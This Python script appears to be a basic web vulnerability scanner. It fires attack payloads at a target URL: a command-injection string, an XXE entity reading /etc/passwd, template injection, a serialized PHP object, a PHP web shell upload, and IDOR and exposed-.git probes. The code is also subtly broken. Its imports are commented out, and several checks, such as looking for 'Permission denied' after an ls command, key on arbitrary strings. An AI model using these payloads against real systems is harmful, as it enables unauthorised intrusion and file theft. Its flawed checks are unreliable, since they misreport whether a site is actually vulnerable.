# import requests
# from bs4 import BeautifulSoup
# import re

# Function to check for Remote Code Execution (RCE)
def check_rce(url):
    # Example payload to execute a command
    payload = "; ls -la"
    try:
        response = requests.get(url + payload)
        if "Permission denied" in response.text:
            print("RCE vulnerability found:", url)
    except Exception as e:
        pass

# Function to check for XML External Entity (XXE) Injection
def check_xxe(url):
    # Example payload to trigger XXE
    payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
    try:
        response = requests.post(url, data=payload)
        if "root:" in response.text:
            print("XXE vulnerability found:", url)
    except Exception as e:
        pass

# Function to check for Server-Side Template Injection (SSTI)
def check_ssti(url):
    # Example payload to trigger SSTI
    payload = "{{7*7}}"
    try:
        response = requests.post(url, data={"template": payload})
        if "49" in response.text:
            print("SSTI vulnerability found:", url)
    except Exception as e:
        pass

# Function to check for Insecure Deserialization
def check_deserialization(url):
    # Example payload to trigger deserialization
    payload = "a:1:{s:5:\"test\";O:8:\"stdClass\":0:{}}"
    try:
        response = requests.post(url, data=payload)
        if "stdClass" in response.text:
            print("Insecure Deserialization vulnerability found:", url)
    except Exception as e:
        pass

# Function to check for Insecure Direct Object References (IDOR)
def check_idor(url):
    # Example payload to trigger IDOR
    user_id = 1
    try:
        response = requests.get(url + f"/user/{user_id}")
        if "Private Data" in response.text:
            print("IDOR vulnerability found:", url)
    except Exception as e:
        pass

# Function to check for File Upload Vulnerabilities
def check_file_upload(url):
    # Example payload to upload a PHP web shell
    files = {'file': open('webshell.php', 'rb')}
    try:
        response = requests.post(url, files=files)
        if "webshell.php" in response.text:
            print("File Upload vulnerability found:", url)
    except Exception as e:
        pass

# Function to check for Insecure Authentication
def check_authentication(url, username, password):
    # Example payload to test authentication bypass
    try:
        response = requests.post(url, data={"username": username, "password": password})
        if response.status_code == 200 and "Logged in as admin" in response.text:
            print("Insecure Authentication vulnerability found:", url)
    except Exception as e:
        pass

# Function to check for Insecure Authorization
def check_authorization(url, user_token):
    # Example payload to test authorization bypass
    try:
        response = requests.get(url, headers={"Authorization": "Bearer " + user_token})
        if response.status_code == 200 and "Admin Panel" in response.text:
            print("Insecure Authorization vulnerability found:", url)
    except Exception as e:
        pass

# Function to check for Sensitive Data Exposure
def check_sensitive_data_exposure(url):
    try:
        response = requests.get(url)
        if "API Key" in response.text:
            print("Sensitive Data Exposure vulnerability found:", url)
    except Exception as e:
        pass

# Function to check for Security Misconfiguration
def check_security_misconfiguration(url):
    # Example payload to test for directory listing
    try:
        response = requests.get(url + "/.git")
        if "Index of /.git" in response.text:
            print("Security Misconfiguration vulnerability found:", url)
    except Exception as e:
        pass


